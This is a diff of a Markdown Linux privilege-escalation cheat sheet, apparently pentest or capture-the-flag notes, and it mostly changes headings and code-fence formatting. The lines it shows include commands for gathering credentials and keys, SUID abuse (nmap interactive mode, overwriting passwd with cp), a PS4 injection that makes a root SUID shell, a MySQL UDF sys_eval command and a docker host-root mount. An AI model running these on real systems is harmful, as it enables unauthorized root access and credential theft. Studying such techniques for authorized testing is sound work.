@@ -33,19 +33,19 @@ export TERM=linux
 
 ### Automated scripts
 
-```
-linPEAS.sh
+```bash
+linPEAS.sh => #https://github.com/peass-ng/PEASS-ng/releases/tag/20240721-1e44f951
 LinEnum.sh
 linuxprivchecker.py
 unix-privesc-check
 Mestaploit: multi/recon/local_exploit_suggester
 ```
 
-#### Check environment
+## Check environment
 
-Check OS and Kernel
+### Check OS and Kernel
 
-```
+```bash
 cat /etc/issue
 cat /etc/*-release
   cat /etc/lsb-release      # Debian based
@@ -59,9 +59,9 @@ dmesg | grep Linux
 ls /boot | grep vmlinuz-
 ```
 
-Check environment variables
+### Check environment variables
 
-```
+```bash
 cat /etc/profile
 cat /etc/bashrc
 cat ~/.bash_profile
@@ -74,20 +74,20 @@ set
 lpstat -a
 ```
 
-Check any restricitions on any folders
+### Check any restricitions on any folders
 
-```
+```bash
 mount -l        >> any no exec or no suid?  
 
 Check any unmounted drives  
 cat /etc/fstab  
 ```
 
-#### Applications and services
+## Applications and services
 
-Running application / services
+### Running application / services
 
-```
+```bash
 ps aux
 ps -ef
 top
@@ -99,9 +99,9 @@ ps -ef | grep root
 
 ```
 
-Installed applications - Check for vulnerable versions
+### Installed applications - Check for vulnerable versions
 
-```
+```bash
 ls -alh /usr/bin/
 ls -alh /sbin/
 dpkg -l
@@ -111,9 +111,9 @@ ls -alh /var/cache/yum/
 pspy4 - to capture change in processes 
 ```
 
-Application config files
+### Application config files
 
-```
+```bash
 cat /etc/syslog.conf
 cat /etc/chttp.conf
 cat /etc/lighttpd.conf
@@ -126,9 +126,9 @@ cat /opt/lampp/etc/httpd.conf
 ls -aRl /etc/ | awk '$1 ~ /^.*r.*/
 ```
 
-Jobs / CRONS
+### Jobs / CRONS
 
-```
+```bash
 crontab -l
 ls -alh /var/spool/cron
 ls -al /etc/ | grep cron
@@ -161,15 +161,13 @@ for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; do
 SystemD timers
 systemctl list-timers -all
 # watch for recently executed timers 
-
-
 ```
 
-#### Network
+## Network
 
-Network details
+### Network details
 
-```
+```bash
 /sbin/ifconfig -a
 cat /etc/network/interfaces
 cat /etc/sysconfig/network
@@ -184,9 +182,9 @@ hostname
 dnsdomainname
 ```
 
-Existing connections
+### Existing connections
 
-```
+```bash
 lsof -i
 lsof -i :80
 grep 80 /etc/services
@@ -207,9 +205,9 @@ route
 tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.5.5.252 21
 ```
 
-#### USER and sensitive info
+### USER and sensitive info
 
-```
+```bash
 id
 who
 w
@@ -256,9 +254,9 @@ cat /etc/ssh/ssh_host_key.pub
 cat /etc/ssh/ssh_host_key
 ```
 
-#### FileSystem
+### FileSystem
 
-```
+```bash
 
 cat /etc/fstab
 cat /etc/exports
@@ -341,9 +339,9 @@ ls -alh /var/log/proftpd/
 ls -alh /var/log/samba/
 ```
 
-#### Find SUID Files
+### Find SUID Files
 
-```
+```bash
 find / -perm -1000 -type d 2>/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.  
 find / -perm -g=s -type f 2>/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.  
 find / -perm -u=s -type f 2>/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.  
@@ -357,24 +355,24 @@ find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev
 find / perm /u=s -user "User name that you are looking for" 2>/dev/null  
 ```
 
-#### Writable file and nobody files
+### Writable file and nobody files
 
-```
+```bash
 find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print   # world-writeable files  
 find /dir -xdev \( -nouser -o -nogroup \) -print   # Noowner files  
 ```
 
-#### Writable by current user
+### Writable by current user
 
-```
+```bash
 find / perm /u=w -user `whoami` 2>/dev/null  
 find / -perm /u+w,g+w -f -user `whoami` 2>/dev/null  
 find / -perm /u+w -user `whoami` 2>/dev/nul  
 ```
 
-#### Any script files that we can modify?
+### Any script files that we can modify?
 
-```
+```bash
 find / -writable -type f -name "*.py" 2>/dev/null     #find all python file that can be write by us  
 
 ls -aRl / | awk '$1 ~ /^.*w.*/' 2>/dev/null     # Anyone  
@@ -386,26 +384,26 @@ find / -readable -type f 2>/dev/null               # Anyone
 find / -readable -type f -maxdepth 1 2>/dev/null   # Anyone  
 ```
 
-#### Any service running by root?
+### Any service running by root?
 
-```
+```bash
 ps aux|grep "root"  
 
 /usr/bin/journalctl (Which is normally not readable by a user) << cron job?  
 ```
 
-#### Find password
+### Find password
 
-```
+```bash
 grep -rnw '/' -ie 'pass' --color=always  
 grep -rnw '/' -ie 'DB_PASS' --color=always  
 grep -rnw '/' -ie 'DB_PASSWORD' --color=always  
 grep -rnw '/' -ie 'DB_USER' --color=always  
 ```
 
-**Interesting files**
+### **Interesting files**
 
-```
+```bash
 Files modified in the last 5 mins
 find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
 
@@ -424,16 +422,18 @@ find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/gam
 
 ```
 
-### Exploitation techniques
+## Exploitation techniques
 
-#### SUID
+### SUID
 
-find / -perm -4000 -type f -exec ls -la {} 2>/dev/null\
+```bash
+find / -perm -4000 -type f -exec ls -la {} 2>/dev/null
 Check GTFOBins
-
-**Is suid bit set on these applications?**
-
 ```
+
+### **Is suid bit set on these applications?**
+
+```bash
 Nmap  
     nmap -V     <Nmap version 2.02 - 5.21 had an interactive mode  
     nmap --interactive  
@@ -469,12 +469,12 @@ cp
     Use cp to overwrite passwd with a new password  
 ```
 
-#### Is there a custom SUID / SUDO application?
+### Is there a custom SUID / SUDO application?
 
 How can this application be run?\
 Can be modify the path variable so that it will execute something else
 
-```
+```bash
 find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \
 
 Operation of this application 
@@ -519,13 +519,13 @@ env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp && chown root.root /tmp/bash &&
 
 ```
 
-#### NFS priv esc
+### NFS priv esc
 
 https://medium.com/@Kan1shka9/hacklab-vulnix-walkthrough-b2b71534c0eb
 
 ### Linux capability
 
-```
+```bash
 find / -type f -print0 2>/dev/null | xargs -0 getcap 2>/dev/null
 getcap -r /
 getcap -r / 2>/dev/null
@@ -536,7 +536,7 @@ google that capability on how it can help us get root
 
 ### Mysql run by root
 
-```
+```bash
 MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library
 https://www.exploit-db.com/exploits/1518/
 
@@ -548,7 +548,7 @@ select sys_eval('echo test>/tmp/test.txt');
 
 ### Docker group
 
-```
+```bash
 #https://medium.com/@Affix/privilege-escallation-with-docker-56dc682a6e17
 docker run -it --volume /:/mnt alpine:latest chroot /mnt
 
@@ -557,7 +557,7 @@ Overwite etc/passwd inside docker to gain root
 
 ### SSH bad keys attack
 
-```
+```bash
 If Authorized_keys is readable, check for the public key content in debian-ssh github for private keys - refer Payload all the things
 https://github.com/g0tmi1k/debian-ssh
 
